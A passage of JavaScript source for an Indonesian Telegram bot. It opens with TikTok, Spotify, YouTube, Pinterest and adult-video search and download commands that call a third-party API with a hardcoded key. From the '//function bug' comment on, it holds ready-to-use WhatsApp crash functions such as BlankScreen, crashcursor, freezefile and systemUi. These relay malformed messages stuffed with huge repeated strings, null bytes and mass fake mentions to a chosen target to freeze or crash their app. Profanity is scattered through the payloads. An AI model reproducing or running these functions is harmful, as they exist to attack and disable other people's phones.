      ctx.reply("Tidak dapat menemukan audio. Periksa URL yang kamu kirim.");
    }
  } catch (error) {
    ctx.reply("Terjadi kesalahan, coba lagi nanti!");
    console.error(error);
  }
});
// Daftar untuk menyimpan sesi perangkat
bot.command("tiktokmp3", async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(" ");

  if (args.length < 2) {
    return ctx.reply("𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗦𝗮𝗹𝗮𝗵!\n [ Cobalah /tiktokmp3 < url > ]");
  }

  const videoUrl = args[1];
  const apiUrl = `https://api.betabotz.eu.org/api/download/tiktok?url=${videoUrl}&apikey=caywzzaja2`;

  // Reply dengan pesan 'Proses' saat mulai
  await ctx.reply("Proses mengunduh audio...⏱️");

  try {
    // Menggunakan axios untuk mengambil data dari API
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status) {
      // Mengambil data audio dan informasi lainnya dari API response
      const audioUrl = data.result.audio[0];
      const title = data.result.title;

      // Kirim audio dengan format MP3
      await ctx.replyWithAudio(audioUrl, {
        caption: `${title}`,
        title: `${title}.mp3`,
      });

      // Reply dengan pesan 'Selesai' setelah selesai mengirim audio
      await ctx.reply("Selesai! ✅");
    } else {
      ctx.reply("Tidak dapat menemukan audio. Periksa URL yang kamu kirim.");
    }
  } catch (error) {
    ctx.reply("Terjadi kesalahan, coba lagi nanti!");
    console.error(error);
  }
});
bot.command("spotifymp3", async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(" ");

  if (args.length < 2) {
    return ctx.reply("𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗦𝗮𝗹𝗮𝗵!\n [ Cobalah /spotifymp3 < url > ]");
  }

  const videoUrl = args[1];
  const apiUrl = `https://api.betabotz.eu.org/api/download/spotify?url=${videoUrl}&apikey=caywzzaja2`;

  // Reply dengan pesan 'Proses' saat mulai
  await ctx.reply("Proses mengunduh audio...⏱️");

  try {
    // Menggunakan axios untuk mengambil data dari API
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status && data.result && data.result.data) {
      const result = data.result.data;

      // Mengambil informasi dari respons API
      const audioUrl = result.url;
      const title = result.title;
      const artist = result.artist.name;
      const thumbnail = result.thumbnail;
      const duration = result.duration;

      // Kirim audio dengan format MP3
      await ctx.replyWithAudio(
        { url: audioUrl }, // URL audio
        {
          caption: `🎵 𝐉𝐮𝐝𝐮𝐥: ${title}\n🎤 𝐀𝐫𝐭𝐢𝐬𝐭: ${artist}\n⏱ 𝐃𝐮𝐫𝐚𝐬𝐢: ${duration}\n# T.me/caywzzaja`,
          thumb: { url: thumbnail }, // Thumbnail dari lagu
          performer: artist,
          title: title,
        }
      );

      // Reply dengan pesan 'Selesai' setelah selesai mengirim audio
      await ctx.reply("Selesai! ✅");
    } else {
      ctx.reply("Tidak dapat menemukan audio. Periksa URL yang kamu kirim.");
    }
  } catch (error) {
    ctx.reply("Terjadi kesalahan, coba lagi nanti!");
    console.error(error);
  }
});
// Fungsi untuk escape karakter Markdown
function escapeMarkdown(text) {
  if (typeof text !== "string") return text;
  return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
}
// Komando TikTok search
bot.command("tiktoksearch", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply("Harap masukkan kata kunci pencarian. Contoh: /tiktoksearch perfect world");
  }

  try {
    const apiUrl = `https://api.betabotz.eu.org/api/search/tiktoks?query=${encodeURIComponent(query)}&apikey=caywzzaja2`;
    const response = await axios.get(apiUrl);

    if (response.data.status && response.data.result.data.length > 0) {
      const results = response.data.result.data;
      let currentIndex = 0;

      const sendVideo = async (index) => {
        const video = results[index];
        if (!video) {
          return ctx.reply("Video tidak ditemukan.");
        }

        const caption = `
🎥 *${escapeMarkdown(video.title)}*
⏱️ Durasi: ${escapeMarkdown(video.duration.toString())} detik
👀 Dilihat: ${escapeMarkdown(video.play_count.toString())}
❤️ Likes: ${escapeMarkdown(video.digg_count.toString())}
💬 Komentar: ${escapeMarkdown(video.comment_count.toString())}
🔗 [Tonton di TikTok](${escapeMarkdown(video.play)})
👤 Author: ${escapeMarkdown(video.author.nickname)} (@${escapeMarkdown(video.author.unique_id)})
        `.trim();

        await ctx.replyWithVideo(
          { url: video.play },
          {
            caption: caption,
            parse_mode: "Markdown",
            reply_markup: Markup.inlineKeyboard([
              Markup.button.callback("⬅️ Back", `back_${index}`),
              Markup.button.callback("Next ➡️", `next_${index}`)
            ])
          }
        );
      };

      await sendVideo(currentIndex);

      // Aksi tombol "Back"
      bot.action(/back_(\d+)/, async (ctx) => {
        currentIndex = Math.max(0, parseInt(ctx.match[1]) - 1);
        await sendVideo(currentIndex);
        await ctx.answerCbQuery(); // Menutup callback query
      });

      // Aksi tombol "Next"
      bot.action(/next_(\d+)/, async (ctx) => {
        currentIndex = Math.min(results.length - 1, parseInt(ctx.match[1]) + 1);
        await sendVideo(currentIndex);
        await ctx.answerCbQuery(); // Menutup callback query
      });

    } else {
      ctx.reply("Tidak ada hasil pencarian untuk kata kunci tersebut.");
    }
  } catch (error) {
    console.error("Error:", error.response ? error.response.data : error.message);
    ctx.reply("Terjadi kesalahan saat mencari video TikTok.");
  }
});
bot.command("xvideosearch", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply(
      "Harap masukkan kata kunci pencarian. Contoh: /xvideosearch nuru massage"
    );
  }

  try {
    const apiUrl = `https://api.betabotz.eu.org/api/search/xvideos?query=${encodeURIComponent(
      query
    )}&apikey=caywzzaja2`;
    const response = await axios.get(apiUrl);

    if (response.data.status && response.data.result.length > 0) {
      const video = response.data.result[0]; // Ambil hanya hasil pertama
      const caption = `
🎥 *${video.title}*
⏱️ Durasi: ${video.duration}
🔗 [Tonton Video](<${video.url}>)
`.trim();

      // Cek jika thumbnail tersedia, digunakan sebagai alternatif.
      const videoUrl = video.thumb || video.url;

      await ctx.replyWithVideo(
        { url: videoUrl },
        { caption: caption, parse_mode: "Markdown" }
      );
    } else {
      ctx.reply("Tidak ada hasil ditemukan untuk pencarian tersebut.");
    }
  } catch (error) {
    console.error("Error saat mengakses API:", error);
    ctx.reply(
      "Terjadi kesalahan saat melakukan pencarian. Silakan coba lagi nanti."
    );
  }
});
// Fungsi untuk menghindari error format Markdown
function escapeMarkdown(text) {
  return text.replace(/([*_`])/g, "\\$1");
}
bot.command("spotify", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply(
      "Harap masukkan kata kunci pencarian.\nContoh: /spotify DJ Dalinda"
    );
  }

  try {
    const apiUrl = `https://api.betabotz.eu.org/api/search/spotify?query=${encodeURIComponent(query)}&apikey=caywzzaja2`;
    const response = await axios.get(apiUrl);

    if (response.data.status && response.data.result.data.length > 0) {
      const results = response.data.result.data.slice(0, 5); // Ambil 5 hasil teratas

      for (const song of results) {
        const caption = `
🎵 *${escapeMarkdown(song.title)}*
⏱️ Durasi: ${escapeMarkdown(song.duration)}
🔥 Popularitas: ${escapeMarkdown(song.popularity)}
🔗 [Dengarkan di Spotify](${song.url})
        `.trim();

        // Kirimkan thumbnail lagu (jika tersedia preview)
        if (song.preview) {
          await ctx.replyWithAudio(
            { url: song.preview },
            { caption, parse_mode: "Markdown" }
          );
        } else {
          await ctx.reply(
            `${caption}\n\n⚠️ Tidak ada pratinjau audio yang tersedia.`,
            { parse_mode: "Markdown" }
          );
        }
      }
    } else {
      ctx.reply("Tidak ada hasil ditemukan untuk pencarian tersebut.");
    }
  } catch (error) {
    console.error("Error saat mengakses API:", error);
    ctx.reply(
      "Terjadi kesalahan saat mengambil data dari Spotify. Silakan coba lagi nanti."
    );
  }
});
bot.command("youtubesearch", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply(
      "𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗦𝗮𝗹𝗮𝗵!\n [ Cobalah /youtubesearch < query > ]"
    );
  }

  try {
    const apiUrl = `https://api.betabotz.eu.org/api/search/yts?query=${encodeURIComponent(query)}&apikey=caywzzaja2`;
    const response = await axios.get(apiUrl);

    if (response.data.status && response.data.result.length > 0) {
      const results = response.data.result.slice(0, 5); // Ambil 5 hasil teratas

      for (const video of results) {
        const caption = `
🎥 *${escapeMarkdown(video.title)}*
📆 Dipublikasikan: ${escapeMarkdown(video.published_at || "Tidak diketahui")}
👀 Penayangan: ${escapeMarkdown(video.views.toString())}
⏱️ Durasi: ${escapeMarkdown(video.duration)}
📜 Deskripsi: ${escapeMarkdown(video.description || "Tidak ada deskripsi.")}
🎤 Channel: [${escapeMarkdown(video.author.name)}](${video.author.url})
🔗 [Tonton di YouTube](${video.url})
        `.trim();

        // Kirimkan thumbnail video (jika tersedia)
        if (video.thumbnail) {
          await ctx.replyWithPhoto(
            { url: video.thumbnail },
            { caption, parse_mode: "Markdown" }
          );
        } else {
          await ctx.reply(
            `${caption}\n\n⚠️ Thumbnail tidak tersedia.`,
            { parse_mode: "Markdown" }
          );
        }
      }
    } else {
      ctx.reply("Tidak ada hasil ditemukan untuk pencarian tersebut.");
    }
  } catch (error) {
    console.error("Error saat mengakses API:", error);
    ctx.reply(
      "Terjadi kesalahan saat mengambil data dari YouTube. Silakan coba lagi nanti."
    );
  }
});
bot.command('googleimage', async (ctx) => {
  const fullArgs = ctx.message.text.split(' ').slice(1).join(' ');

  if (!fullArgs) {
    return ctx.reply('Contoh: /googleimage hutao genshin impact, modern');
  }

  await ctx.reply("⏱️ Tunggu sebentar...");
  try {
    // Ambil data dari API
    const response = await axios.get(
      `https://api.betabotz.eu.org/api/search/googleimage?text1=${encodeURIComponent(fullArgs)}&apikey=caywzzaja2`
    );

    const data = response.data;

    if (data.status && data.result.length > 0) {
      // Kirim gambar pertama dari hasil API
      const firstImage = data.result[0];
      await ctx.replyWithPhoto(
        { url: firstImage.url },
        { caption: `𝗣𝗿𝗼𝗺𝗽𝘁𝘀:\n${fullArgs}\n\n𝗗𝗶𝗺𝗲𝗻𝘀𝗶:\n${firstImage.width}x${firstImage.height}` }
      );
    } else {
      await ctx.reply('Tidak ada gambar yang ditemukan.');
    }
  } catch (err) {
    await ctx.reply(`Terjadi kesalahan: ${err.message}`);
  }
  await ctx.reply("✅ Selesai!");
});
bot.command('pinterest', async (ctx) => {
  const fullArgs = ctx.message.text.split(' ').slice(1).join(' ');

  if (!fullArgs) {
    return ctx.reply('Contoh: /pinterest hutao genshin impact, modern');
  }

  await ctx.reply("⏱️ Tunggu sebentar...");
  try {
    // Ambil data dari API
    const response = await axios.get(
      `https://api.betabotz.eu.org/api/search/pinterest?text1=${encodeURIComponent(fullArgs)}&apikey=caywzzaja2`
    );

    const data = response.data;

    if (data.status && data.result.length > 0) {
      // Ambil hingga 5 gambar dari hasil API
      const images = data.result.slice(0, 5);

      for (const [index, imageUrl] of images.entries()) {
        await ctx.replyWithPhoto(
          { url: imageUrl },
          { caption: `𝗣𝗿𝗼𝗺𝗽𝘁𝘀: ${fullArgs}\nGambar ke-${index + 1}` }
        );
      }
    } else {
      await ctx.reply('Tidak ada gambar yang ditemukan.');
    }
  } catch (err) {
    await ctx.reply(`Terjadi kesalahan: ${err.message}`);
  }
  await ctx.reply("✅ Selesai!");
});
// API Betabotz
bot.command('xcimage', async (ctx) => {
  const fullArgs = ctx.message.text.split(' ').slice(1).join(' ');

  if (!fullArgs) {
    return ctx.reply('Contoh: /xcimage hutao genshin impact, modern');
  }

  await ctx.reply("⏱️ Tunggu 30 detik...");
  try {
    await ctx.replyWithPhoto(
      { url: `https://love.neekoi.me/kivotos?text=${encodeURIComponent(fullArgs)}` },
      { caption: `𝗣𝗿𝗼𝗺𝗽𝘁𝘀:\n${fullArgs}` }
    );
  } catch (err) {
    await ctx.reply(`Error: ${err.message}`);
  }
  await ctx.reply("✅ Selesai!");
});

bot.command('xcimage2', async (ctx) => {
  const fullArgs = ctx.message.text.split(' ').slice(1).join(' ');

  if (!fullArgs) {
    return ctx.reply('Contoh: /xcimage2 hutao genshin impact, modern');
  }

  await ctx.reply("⏱️ Tunggu 30 detik...");
  try {
    await ctx.replyWithPhoto(
      { url: `https://love.neekoi.me/noa?text=${encodeURIComponent(fullArgs)}` },
      { caption: `𝗣𝗿𝗼𝗺𝗽𝘁𝘀:\n${fullArgs}` }
    );
  } catch (err) {
    await ctx.reply(`Error: ${err.message}`);
  }
  await ctx.reply("✅ Selesai!");
});


//function bug

	
async function XeonXRobust(target, o, ptcp = true) {
  const jids = `_*~@0~*_\n`.repeat(10200);
  const ui = 'ꦽ'.repeat(1500);

  await cay.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: o,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: '🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟' + ui + jids,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
 async function BlankScreen(target, Ptcp = false) {
let virtex =  "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦽ".repeat(45000) + "@13135550002".repeat(50000);
			await cay.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Halo🤗",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["13135550002@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
            console.log(chalk.red.bold('🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿'))
   	};
   	const tdxlol = fs.readFileSync('./tdx.jpeg')
   	const crypto = require('crypto');
async function crashcursor(target, ptcp = true) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Assalamualaikum Bang Izin Pushkontak" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: cay.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "- Kami Yo \"👋\"",
                    footerText: "© Caywzz",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: tdxlol,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/devor6core",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! Starevxz - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© running since 2020 to 20##?",
thumbnail: tdxlol,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: `- Caywzz 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "by : Caywzz "
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await cay.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}
     	async function freezefile(target, QBug, Ptcp = true) {
    let virtex = "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦾ".repeat(250000) + "@0".repeat(250000);
    await cay.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "Wkwk.",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function buginvite(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "caywzz",
                    },
                ],
            },
        };

        await cay.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function crashUiV5(target, Ptcp = false) {
    cay.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟" + "@0".repeat(250000) + "ꦾ".repeat(100000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "Caywzz"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
};
async function systemUi(target, Ptcp = false) {
    cay.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Caywzz" }]
                    }
                }
            }
        }
    }, { participant: { jid: target },  messageId: null });
};
async function systemUi2(target, Ptcp = false) {
    cay.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "Caywzz",
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: "{\"display_text\":\"Caywzz!\",\"id\":\".groupchat\"}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: {
                                    title: "Caywzz",
                                    sections: [
